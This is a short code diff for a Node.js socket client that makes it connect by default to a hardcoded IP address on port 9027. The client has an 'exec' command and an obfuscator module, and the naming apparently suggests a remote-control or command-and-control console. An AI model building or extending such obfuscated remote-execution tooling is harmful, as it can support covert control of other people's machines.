@@ -1,6 +1,7 @@
 'use strict'
 
 const ASSIMILATOR_PORT = 9027
+const ASSIMILATOR_HOST = '52.38.225.69'
 const COMMANDS = ['ls', 'info', 'use', 'exec', 'quit']
 
 const socket = require('net').Socket()
@@ -9,12 +10,7 @@ const archonID = require('node-uuid').v4()
 const obfuscator = require('./obfuscator')
 
 const argv = process.argv.splice(2)
-if (!argv.length) {
-  console.log(`usage: ${process.argv[0]} hostname`)
-  process.exit(1)
-}
-
-const host = argv[0]
+const host = argv.length ? argv[0] : ASSIMILATOR_HOST
 
 const state = {
   waiting: false,
